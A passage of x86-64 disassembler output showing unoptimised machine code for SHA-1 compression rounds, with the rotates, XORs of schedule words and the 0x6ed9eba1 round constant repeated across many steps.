  40439a:	89 c0                	mov    %eax,%eax
  40439c:	48 c1 e8 1f          	shr    $0x1f,%rax
  4043a0:	48 09 c8             	or     %rcx,%rax
  4043a3:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  4043a7:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4043ab:	48 01 c2             	add    %rax,%rdx
  4043ae:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4043b5:	48 01 d0             	add    %rdx,%rax
  4043b8:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4043be:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4043c5:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4043cc:	48 c1 e0 1e          	shl    $0x1e,%rax
  4043d0:	48 89 c2             	mov    %rax,%rdx
  4043d3:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4043da:	89 c0                	mov    %eax,%eax
  4043dc:	48 c1 e8 02          	shr    $0x2,%rax
  4043e0:	48 09 d0             	or     %rdx,%rax
  4043e3:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4043ea:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  4043ee:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4043f2:	48 31 c2             	xor    %rax,%rdx
  4043f5:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4043f9:	48 31 c2             	xor    %rax,%rdx
  4043fc:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  404400:	48 31 d0             	xor    %rdx,%rax
  404403:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40440a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404411:	48 c1 e0 05          	shl    $0x5,%rax
  404415:	48 89 c2             	mov    %rax,%rdx
  404418:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40441f:	89 c0                	mov    %eax,%eax
  404421:	48 c1 e8 1b          	shr    $0x1b,%rax
  404425:	48 89 d1             	mov    %rdx,%rcx
  404428:	48 09 c1             	or     %rax,%rcx
  40442b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404432:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404439:	48 31 d0             	xor    %rdx,%rax
  40443c:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404443:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404447:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40444e:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404452:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404459:	89 c0                	mov    %eax,%eax
  40445b:	48 c1 e8 1f          	shr    $0x1f,%rax
  40445f:	48 09 c8             	or     %rcx,%rax
  404462:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  404466:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  40446a:	48 01 c2             	add    %rax,%rdx
  40446d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404474:	48 01 d0             	add    %rdx,%rax
  404477:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40447d:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404484:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40448b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40448f:	48 89 c2             	mov    %rax,%rdx
  404492:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404499:	89 c0                	mov    %eax,%eax
  40449b:	48 c1 e8 02          	shr    $0x2,%rax
  40449f:	48 09 d0             	or     %rdx,%rax
  4044a2:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4044a9:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  4044ad:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  4044b1:	48 31 c2             	xor    %rax,%rdx
  4044b4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4044b8:	48 31 c2             	xor    %rax,%rdx
  4044bb:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  4044bf:	48 31 d0             	xor    %rdx,%rax
  4044c2:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4044c9:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4044d0:	48 c1 e0 05          	shl    $0x5,%rax
  4044d4:	48 89 c2             	mov    %rax,%rdx
  4044d7:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4044de:	89 c0                	mov    %eax,%eax
  4044e0:	48 c1 e8 1b          	shr    $0x1b,%rax
  4044e4:	48 89 d1             	mov    %rdx,%rcx
  4044e7:	48 09 c1             	or     %rax,%rcx
  4044ea:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4044f1:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4044f8:	48 31 d0             	xor    %rdx,%rax
  4044fb:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  404502:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404506:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40450d:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404511:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404518:	89 c0                	mov    %eax,%eax
  40451a:	48 c1 e8 1f          	shr    $0x1f,%rax
  40451e:	48 09 c8             	or     %rcx,%rax
  404521:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  404525:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404529:	48 01 c2             	add    %rax,%rdx
  40452c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404533:	48 01 d0             	add    %rdx,%rax
  404536:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  40453c:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404543:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40454a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40454e:	48 89 c2             	mov    %rax,%rdx
  404551:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404558:	89 c0                	mov    %eax,%eax
  40455a:	48 c1 e8 02          	shr    $0x2,%rax
  40455e:	48 09 d0             	or     %rdx,%rax
  404561:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404568:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  40456c:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404570:	48 31 c2             	xor    %rax,%rdx
  404573:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404577:	48 31 c2             	xor    %rax,%rdx
  40457a:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40457e:	48 31 d0             	xor    %rdx,%rax
  404581:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404588:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40458f:	48 c1 e0 05          	shl    $0x5,%rax
  404593:	48 89 c2             	mov    %rax,%rdx
  404596:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40459d:	89 c0                	mov    %eax,%eax
  40459f:	48 c1 e8 1b          	shr    $0x1b,%rax
  4045a3:	48 89 d1             	mov    %rdx,%rcx
  4045a6:	48 09 c1             	or     %rax,%rcx
  4045a9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4045b0:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4045b7:	48 31 d0             	xor    %rdx,%rax
  4045ba:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  4045c1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4045c5:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4045cc:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4045d0:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4045d7:	89 c0                	mov    %eax,%eax
  4045d9:	48 c1 e8 1f          	shr    $0x1f,%rax
  4045dd:	48 09 c8             	or     %rcx,%rax
  4045e0:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  4045e4:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  4045e8:	48 01 c2             	add    %rax,%rdx
  4045eb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4045f2:	48 01 d0             	add    %rdx,%rax
  4045f5:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4045fb:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404602:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404609:	48 c1 e0 1e          	shl    $0x1e,%rax
  40460d:	48 89 c2             	mov    %rax,%rdx
  404610:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404617:	89 c0                	mov    %eax,%eax
  404619:	48 c1 e8 02          	shr    $0x2,%rax
  40461d:	48 09 d0             	or     %rdx,%rax
  404620:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  404627:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  40462b:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  40462f:	48 31 c2             	xor    %rax,%rdx
  404632:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404636:	48 31 c2             	xor    %rax,%rdx
  404639:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  40463d:	48 31 d0             	xor    %rdx,%rax
  404640:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404647:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40464e:	48 c1 e0 05          	shl    $0x5,%rax
  404652:	48 89 c2             	mov    %rax,%rdx
  404655:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40465c:	89 c0                	mov    %eax,%eax
  40465e:	48 c1 e8 1b          	shr    $0x1b,%rax
  404662:	48 89 d1             	mov    %rdx,%rcx
  404665:	48 09 c1             	or     %rax,%rcx
  404668:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40466f:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404676:	48 31 d0             	xor    %rdx,%rax
  404679:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404680:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404684:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40468b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40468f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404696:	89 c0                	mov    %eax,%eax
  404698:	48 c1 e8 1f          	shr    $0x1f,%rax
  40469c:	48 09 c8             	or     %rcx,%rax
  40469f:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  4046a3:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4046a7:	48 01 c2             	add    %rax,%rdx
  4046aa:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4046b1:	48 01 d0             	add    %rdx,%rax
  4046b4:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4046ba:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4046c1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4046c8:	48 c1 e0 1e          	shl    $0x1e,%rax
  4046cc:	48 89 c2             	mov    %rax,%rdx
  4046cf:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4046d6:	89 c0                	mov    %eax,%eax
  4046d8:	48 c1 e8 02          	shr    $0x2,%rax
  4046dc:	48 09 d0             	or     %rdx,%rax
  4046df:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4046e6:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  4046ea:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4046ee:	48 31 c2             	xor    %rax,%rdx
  4046f1:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4046f5:	48 31 c2             	xor    %rax,%rdx
  4046f8:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4046fc:	48 31 d0             	xor    %rdx,%rax
  4046ff:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404706:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40470d:	48 c1 e0 05          	shl    $0x5,%rax
  404711:	48 89 c2             	mov    %rax,%rdx
  404714:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40471b:	89 c0                	mov    %eax,%eax
  40471d:	48 c1 e8 1b          	shr    $0x1b,%rax
  404721:	48 89 d1             	mov    %rdx,%rcx
  404724:	48 09 c1             	or     %rax,%rcx
  404727:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40472e:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404735:	48 31 d0             	xor    %rdx,%rax
  404738:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  40473f:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404743:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40474a:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40474e:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404755:	89 c0                	mov    %eax,%eax
  404757:	48 c1 e8 1f          	shr    $0x1f,%rax
  40475b:	48 09 c8             	or     %rcx,%rax
  40475e:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
  404762:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  404766:	48 01 c2             	add    %rax,%rdx
  404769:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404770:	48 01 d0             	add    %rdx,%rax
  404773:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404779:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404780:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404787:	48 c1 e0 1e          	shl    $0x1e,%rax
  40478b:	48 89 c2             	mov    %rax,%rdx
  40478e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404795:	89 c0                	mov    %eax,%eax
  404797:	48 c1 e8 02          	shr    $0x2,%rax
  40479b:	48 09 d0             	or     %rdx,%rax
  40479e:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4047a5:	48 8b 55 c0          	mov    -0x40(%rbp),%rdx
  4047a9:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4047ad:	48 31 c2             	xor    %rax,%rdx
  4047b0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4047b4:	48 31 c2             	xor    %rax,%rdx
  4047b7:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  4047bb:	48 31 d0             	xor    %rdx,%rax
  4047be:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4047c5:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4047cc:	48 c1 e0 05          	shl    $0x5,%rax
  4047d0:	48 89 c2             	mov    %rax,%rdx
  4047d3:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4047da:	89 c0                	mov    %eax,%eax
  4047dc:	48 c1 e8 1b          	shr    $0x1b,%rax
  4047e0:	48 89 d1             	mov    %rdx,%rcx
  4047e3:	48 09 c1             	or     %rax,%rcx
  4047e6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4047ed:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4047f4:	48 31 d0             	xor    %rdx,%rax
  4047f7:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  4047fe:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404802:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404809:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40480d:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404814:	89 c0                	mov    %eax,%eax
  404816:	48 c1 e8 1f          	shr    $0x1f,%rax
  40481a:	48 09 c8             	or     %rcx,%rax
  40481d:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
  404821:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  404825:	48 01 c2             	add    %rax,%rdx
  404828:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40482f:	48 01 d0             	add    %rdx,%rax
  404832:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404838:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  40483f:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404846:	48 c1 e0 1e          	shl    $0x1e,%rax
  40484a:	48 89 c2             	mov    %rax,%rdx
  40484d:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404854:	89 c0                	mov    %eax,%eax
  404856:	48 c1 e8 02          	shr    $0x2,%rax
  40485a:	48 09 d0             	or     %rdx,%rax
  40485d:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404864:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
  404868:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  40486c:	48 31 c2             	xor    %rax,%rdx
  40486f:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404873:	48 31 c2             	xor    %rax,%rdx
  404876:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  40487a:	48 31 d0             	xor    %rdx,%rax
  40487d:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404884:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40488b:	48 c1 e0 05          	shl    $0x5,%rax
  40488f:	48 89 c2             	mov    %rax,%rdx
  404892:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404899:	89 c0                	mov    %eax,%eax
  40489b:	48 c1 e8 1b          	shr    $0x1b,%rax
  40489f:	48 89 d1             	mov    %rdx,%rcx
  4048a2:	48 09 c1             	or     %rax,%rcx
  4048a5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4048ac:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  4048b3:	48 31 d0             	xor    %rdx,%rax
  4048b6:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  4048bd:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4048c1:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4048c8:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  4048cc:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  4048d3:	89 c0                	mov    %eax,%eax
  4048d5:	48 c1 e8 1f          	shr    $0x1f,%rax
  4048d9:	48 09 c8             	or     %rcx,%rax
  4048dc:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
  4048e0:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  4048e4:	48 01 c2             	add    %rax,%rdx
  4048e7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4048ee:	48 01 d0             	add    %rdx,%rax
  4048f1:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4048f7:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4048fe:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404905:	48 c1 e0 1e          	shl    $0x1e,%rax
  404909:	48 89 c2             	mov    %rax,%rdx
  40490c:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404913:	89 c0                	mov    %eax,%eax
  404915:	48 c1 e8 02          	shr    $0x2,%rax
  404919:	48 09 d0             	or     %rdx,%rax
  40491c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404923:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
  404927:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  40492b:	48 31 c2             	xor    %rax,%rdx
  40492e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404932:	48 31 c2             	xor    %rax,%rdx
  404935:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  404939:	48 31 d0             	xor    %rdx,%rax
  40493c:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404943:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40494a:	48 c1 e0 05          	shl    $0x5,%rax
  40494e:	48 89 c2             	mov    %rax,%rdx
  404951:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404958:	89 c0                	mov    %eax,%eax
  40495a:	48 c1 e8 1b          	shr    $0x1b,%rax
  40495e:	48 89 d1             	mov    %rdx,%rcx
  404961:	48 09 c1             	or     %rax,%rcx
  404964:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40496b:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  404972:	48 31 d0             	xor    %rdx,%rax
  404975:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  40497c:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404980:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404987:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40498b:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404992:	89 c0                	mov    %eax,%eax
  404994:	48 c1 e8 1f          	shr    $0x1f,%rax
  404998:	48 09 c8             	or     %rcx,%rax
  40499b:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
  40499f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  4049a3:	48 01 c2             	add    %rax,%rdx
  4049a6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4049ad:	48 01 d0             	add    %rdx,%rax
  4049b0:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  4049b6:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4049bd:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4049c4:	48 c1 e0 1e          	shl    $0x1e,%rax
  4049c8:	48 89 c2             	mov    %rax,%rdx
  4049cb:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4049d2:	89 c0                	mov    %eax,%eax
  4049d4:	48 c1 e8 02          	shr    $0x2,%rax
  4049d8:	48 09 d0             	or     %rdx,%rax
  4049db:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4049e2:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
  4049e6:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  4049ea:	48 31 c2             	xor    %rax,%rdx
  4049ed:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  4049f1:	48 31 c2             	xor    %rax,%rdx
  4049f4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4049f8:	48 31 d0             	xor    %rdx,%rax
  4049fb:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404a02:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404a09:	48 c1 e0 05          	shl    $0x5,%rax
  404a0d:	48 89 c2             	mov    %rax,%rdx
  404a10:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404a17:	89 c0                	mov    %eax,%eax
  404a19:	48 c1 e8 1b          	shr    $0x1b,%rax
  404a1d:	48 89 d1             	mov    %rdx,%rcx
  404a20:	48 09 c1             	or     %rax,%rcx
  404a23:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  404a2a:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  404a31:	48 31 d0             	xor    %rdx,%rax
  404a34:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  404a3b:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404a3f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404a46:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404a4a:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404a51:	89 c0                	mov    %eax,%eax
  404a53:	48 c1 e8 1f          	shr    $0x1f,%rax
  404a57:	48 09 c8             	or     %rcx,%rax
  404a5a:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  404a5e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  404a62:	48 01 c2             	add    %rax,%rdx
  404a65:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404a6c:	48 01 d0             	add    %rdx,%rax
  404a6f:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404a75:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  404a7c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404a83:	48 c1 e0 1e          	shl    $0x1e,%rax
  404a87:	48 89 c2             	mov    %rax,%rdx
  404a8a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404a91:	89 c0                	mov    %eax,%eax
  404a93:	48 c1 e8 02          	shr    $0x2,%rax
  404a97:	48 09 d0             	or     %rdx,%rax
  404a9a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  404aa1:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
  404aa5:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  404aa9:	48 31 c2             	xor    %rax,%rdx
  404aac:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404ab0:	48 31 c2             	xor    %rax,%rdx
  404ab3:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404ab7:	48 31 d0             	xor    %rdx,%rax
  404aba:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404ac1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404ac8:	48 c1 e0 05          	shl    $0x5,%rax
  404acc:	48 89 c2             	mov    %rax,%rdx
  404acf:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  404ad6:	89 c0                	mov    %eax,%eax
  404ad8:	48 c1 e8 1b          	shr    $0x1b,%rax
  404adc:	48 89 d1             	mov    %rdx,%rcx
  404adf:	48 09 c1             	or     %rax,%rcx
  404ae2:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  404ae9:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  404af0:	48 31 d0             	xor    %rdx,%rax
  404af3:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  404afa:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  404afe:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404b05:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  404b09:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  404b10:	89 c0                	mov    %eax,%eax
  404b12:	48 c1 e8 1f          	shr    $0x1f,%rax
  404b16:	48 09 c8             	or     %rcx,%rax
  404b19:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  404b1d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  404b21:	48 01 c2             	add    %rax,%rdx
  404b24:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b2b:	48 01 d0             	add    %rdx,%rax
  404b2e:	48 05 a1 eb d9 6e    	add    $0x6ed9eba1,%rax
  404b34:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  404b3b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404b42:	48 c1 e0 1e          	shl    $0x1e,%rax
  404b46:	48 89 c2             	mov    %rax,%rdx
  404b49:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404b50:	89 c0                	mov    %eax,%eax
  404b52:	48 c1 e8 02          	shr    $0x2,%rax
  404b56:	48 09 d0             	or     %rdx,%rax
  404b59:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  404b60:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  404b64:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  404b68:	48 31 c2             	xor    %rax,%rdx
  404b6b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  404b6f:	48 31 c2             	xor    %rax,%rdx
  404b72:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  404b76:	48 31 d0             	xor    %rdx,%rax
  404b79:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  404b80:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b87:	48 c1 e0 05          	shl    $0x5,%rax
  404b8b:	48 89 c2             	mov    %rax,%rdx
  404b8e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404b95:	89 c0                	mov    %eax,%eax
  404b97:	48 c1 e8 1b          	shr    $0x1b,%rax
  404b9b:	48 89 d1             	mov    %rdx,%rcx
  404b9e:	48 09 c1             	or     %rax,%rcx
  404ba1:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  404ba8:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  404baf:	48 31 d0             	xor    %rdx,%rax
  404bb2:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  404bb9:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
